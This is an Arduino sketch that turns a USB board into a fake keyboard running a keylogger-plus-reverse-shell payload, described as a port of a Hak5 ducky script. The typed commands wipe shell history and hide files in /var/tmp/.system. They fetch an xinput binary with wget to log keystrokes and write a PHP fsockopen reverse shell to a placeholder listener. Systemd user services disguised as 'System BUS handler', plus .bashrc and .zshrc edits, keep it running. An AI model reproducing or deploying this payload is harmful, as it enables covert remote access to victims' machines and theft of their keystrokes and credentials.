// Arduino implementation of Hak5 Duckylogger with reverse shell
// check hak5_rubber_ducky.txt for original hak5 file.
// duckylogger script originally by Hak5, arduino translation done by z5410231


#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // [keeping tracks clear]
  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(116);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE");

  typeKey(KEY_ENTER);

  delay(100);

  // [creating key logging mechanism]

  Keyboard.print("mkdir /var/tmp/.system");

  typeKey(KEY_ENTER);

  delay(100);

  Keyboard.print("echo \"/var/tmp/.system/./xinput list | grep -Po 'id=\\K\\d+(?=.*slave\\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test\" > /var/tmp/.system/sys");

  typeKey(KEY_ENTER);

  delay(100);

  Keyboard.print("chmod +x /var/tmp/.system/sys");

  typeKey(KEY_ENTER);

  delay(100);

  // [importing xinput]

  Keyboard.print("cd /var/tmp/.system/");

  typeKey(KEY_ENTER);

  delay(100);

  Keyboard.print("wget --no-check-certificate --content-disposition https://github.com/drapl0n/DuckyLogger/blob/main/xinput\\?raw=true");

  typeKey(KEY_ENTER);

  delay(2500);

  Keyboard.print("chmod +x xinput");

  typeKey(KEY_ENTER);

  delay(100);

  // [creating reverse shell]

  Keyboard.print("echo -e \"while :\\ndo\\n\\tping -c 5 0.0.0.0\\n\\tif [ $? -eq 0 ]; then\\n\\t\\tphp -r '\\$sock=fsockopen(\\\"listening_ip_goes_here\\\",listening_port_goes_here);exec(\"\\\"/var/tmp/.system/sys -i \"<&3 >&3 2>&3\"\\\"\");'\\n\\tfi\\ndone\" >  /var/tmp/.system/systemBus");

  typeKey(KEY_ENTER);

  delay(100);

  Keyboard.print("chmod +x /var/tmp/.system/systemBus");

  typeKey(KEY_ENTER);

  delay(100);

  // [creating systemd service to execute payload on boot]

  Keyboard.print("mkdir -p ~/.config/systemd/user");

  typeKey(KEY_ENTER);

  delay(200);

  Keyboard.print("echo -e \"[Unit]\\nDescription= System BUS handler\\n\\n[Service]\\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\\nRestart=on-failure\\nSuccessExitStatus=3 4\\nRestartForceExitStatus=3 4\\n\\n[Install]\\nWantedBy=default.target\" > ~/.config/systemd/user/systemBUS.service");

  typeKey(KEY_ENTER);

  delay(100);

  // [creating reboot script incase if listner stops or targets internet connection gets lost]

  Keyboard.print("echo \"while true; do systemctl --user restart systemBUS.service; sleep 15m; done\" > /var/tmp/.system/reboot");

  typeKey(KEY_ENTER);

  delay(100);

  Keyboard.print("chmod +x /var/tmp/.system/reboot");

  typeKey(KEY_ENTER);

  delay(100);

  // [creating systemd service to execute payload on boot]

  Keyboard.print("echo -e \"[Unit]\\nDescription= System BUS handler reboot.\\n\\n[Service]\\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\\nRestart=on-failure\\nSuccessExitStatus=3 4\\nRestartForceExitStatus=3 4\\n\\n[Install]\\nWantedBy=default.target\" > ~/.config/systemd/user/reboot.service");

  typeKey(KEY_ENTER);

  delay(100);

  // [enabling service]

  Keyboard.print("systemctl --user daemon-reload");

  typeKey(KEY_ENTER);

  delay(300);

  Keyboard.print("systemctl --user enable --now systemBUS.service");

  typeKey(KEY_ENTER);

  delay(150);

  Keyboard.print("systemctl --user start --now systemBUS.service");

  typeKey(KEY_ENTER);

  delay(150);

  Keyboard.print("systemctl --user enable --now reboot.service");

  typeKey(KEY_ENTER);

  delay(150);

  Keyboard.print("systemctl --user start --now reboot.service");

  typeKey(KEY_ENTER);

  delay(100);

  // [autostarting service on terminal/shell launch]

  Keyboard.print("echo -e \"ls -a | grep 'zshrc' &> /dev/null\\nif [ \\$? = 0 ]; then\\n\\techo \\\"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\\\" >> ~/.zshrc\\nfi\\n\\nls -a | grep 'bashrc' &> /dev/null\\nif [ \\$? = 0 ]; then\\n\\techo \\\"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\\\" >> ~/.bashrc\\nfi\" > ~/tmmmp");

  typeKey(KEY_ENTER);

  delay(100);

  Keyboard.print("chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit");

  typeKey(KEY_ENTER);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
